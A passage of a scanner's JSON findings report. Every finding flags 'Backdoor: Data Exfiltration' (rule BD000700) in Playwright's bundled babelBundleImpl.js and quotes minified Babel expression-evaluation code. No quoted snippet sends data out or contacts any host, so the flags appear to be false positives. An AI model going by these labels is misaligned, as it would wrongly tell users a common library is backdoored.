                    "text": "e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confiden",
                    "rendered": {
                      "text": "e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confiden",
                      "markdown": "`e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confiden`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5187,
                  "endLine": 31,
                  "endColumn": 5192,
                  "snippet": {
                    "text": "Expression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a",
                    "rendered": {
                      "text": "Expression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a",
                      "markdown": "`Expression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5146,
                  "endLine": 31,
                  "endColumn": 5151,
                  "snippet": {
                    "text": "mplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i",
                    "rendered": {
                      "text": "mplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i",
                      "markdown": "`mplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 4948,
                  "endLine": 31,
                  "endColumn": 4953,
                  "snippet": {
                    "text": "th-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionW",
                    "rendered": {
                      "text": "th-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionW",
                      "markdown": "`th-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionW`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 4908,
                  "endLine": 31,
                  "endColumn": 4913,
                  "snippet": {
                    "text": "=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"",
                    "rendered": {
                      "text": "=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"",
                      "markdown": "`=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 4867,
                  "endLine": 31,
                  "endColumn": 4872,
                  "snippet": {
                    "text": "ident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.c",
                    "rendered": {
                      "text": "ident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.c",
                      "markdown": "`ident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"tag.object\"),{node:{name:n}}=r,s=e.get(\"tag.property\");if(r.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.c`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 4610,
                  "endLine": 31,
                  "endColumn": 4615,
                  "snippet": {
                    "text": "],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"t",
                    "rendered": {
                      "text": "],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"t",
                      "markdown": "`],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericLiteral()||e.isBooleanLiteral())return e.node.value;if(e.isNullLiteral())return null;if(e.isTemplateLiteral())return PA(e,e.node.quasis,t);if(e.isTaggedTemplateExpression()&&e.get(\"tag\").isMemberExpression()){let r=e.get(\"t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 4388,
                  "endLine": 31,
                  "endColumn": 4393,
                  "snippet": {
                    "text": ")}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=e,t.confident=!1)}var xA=new Map([[\"undefined\",void 0],[\"Infinity\",1/0],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericL",
                    "rendered": {
                      "text": ")}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=e,t.confident=!1)}var xA=new Map([[\"undefined\",void 0],[\"Infinity\",1/0],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericL",
                      "markdown": "`)}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=e,t.confident=!1)}var xA=new Map([[\"undefined\",void 0],[\"Infinity\",1/0],[\"NaN\",NaN]]);function gr(e,t){let{node:r}=e,{seen:n}=t;if(n.has(r)){let s=n.get(r);if(s.resolved)return s.value;Ln(e,t);return}else{let s={resolved:!1};n.set(r,s);let i=hae(e,t);return t.confident&&(s.resolved=!0,s.value=i),i}}function hae(e,t){if(t.confident){if(e.isSequenceExpression()){let r=e.get(\"expressions\");return gr(r[r.length-1],t)}if(e.isStringLiteral()||e.isNumericL`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2879,
                  "endLine": 31,
                  "endColumn": 2884,
                  "snippet": {
                    "text": "xpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}els",
                    "rendered": {
                      "text": "xpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}els",
                      "markdown": "`xpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}els`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2702,
                  "endLine": 31,
                  "endColumn": 2707,
                  "snippet": {
                    "text": "b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.express",
                    "rendered": {
                      "text": "b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.express",
                      "markdown": "`b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.express`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2627,
                  "endLine": 31,
                  "endColumn": 2632,
                  "snippet": {
                    "text": "erateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(",
                    "rendered": {
                      "text": "erateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(",
                      "markdown": "`erateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2455,
                  "endLine": 31,
                  "endColumn": 2460,
                  "snippet": {
